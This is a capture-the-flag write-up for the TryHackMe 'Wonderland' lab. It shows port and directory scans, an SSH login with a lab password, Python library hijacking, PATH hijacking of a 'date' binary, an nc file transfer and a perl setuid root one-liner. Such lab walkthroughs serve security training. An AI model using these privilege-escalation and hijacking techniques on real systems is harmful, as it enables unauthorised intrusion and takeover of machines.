# Wonderland

**Room Link:** [https://tryhackme.com/room/wonderland](https://tryhackme.com/room/wonderland)

## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (16).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (3) (17).png" alt=""><figcaption></figcaption></figure>

I can see I'm on the right track on the browser

<figure><img src="../../.gitbook/assets/image (5) (13).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u http://$VICTIM/r/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (4) (12).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u http://$VICTIM/r/a -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



After a few letters I was able to just guess the word it's spelling out

<figure><img src="../../.gitbook/assets/image (2) (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (12).png" alt=""><figcaption></figcaption></figure>

## TCP/22 - SSH

**Kali**

```
ssh alice@$VICTIM
Pass: HowDothTheLittleCrocodileImproveHisShiningTail
```

<figure><img src="../../.gitbook/assets/image (7) (12).png" alt=""><figcaption></figcaption></figure>

## Lateral Movement - Abusing Library path

**Victim**

```
sudo -l
cat /home/alice/walrus_and_the_carpenter.py
```

<figure><img src="../../.gitbook/assets/image (9) (12).png" alt=""><figcaption></figcaption></figure>

Using the first command we can see the path it follows, we can see the first thing it will try is the current directory so we can make a random.py script of our own and put anything we want in it.

**Victim**

```
python3 -c 'import sys; print (sys.path)'
locate random.py
```

<figure><img src="../../.gitbook/assets/image (10) (11).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
echo 'import os' > random.py
echo 'os.system("/bin/bash")' >> random.py
cat random.py
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

## Lateral Movement - Abusing Paths

**Kali(receiving)**

```
nc -l -p 1234 > teaParty
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < teaParty
```

### Ghidra

I opened the file in Ghidra and can see that the program is running the date command which we see outputted when we run the script. But note that the date command isn't using the full path so if we add somewhere else in our path we can run our own date command instead.

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

I added tmp to my path

**Victim(rabbit)**

```
echo $PATH
export PATH=/tmp:$PATH
echo $PATH
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

I'm not the hatter

**Victim(rabbit)**

```
cd /tmp
echo '#!/bin/bash' > date
echo '/bin/bash' >> date
chmod +x date
cat date
/home/rabbit/teaParty 
```

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation&#x20;

**Victim(hatter)**

We can just follow what's under capabilities but only the last command as CAP\_SETID is already set for perl.

**Exploit:** [https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/)

```
getcap -r / 2>/dev/null
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>















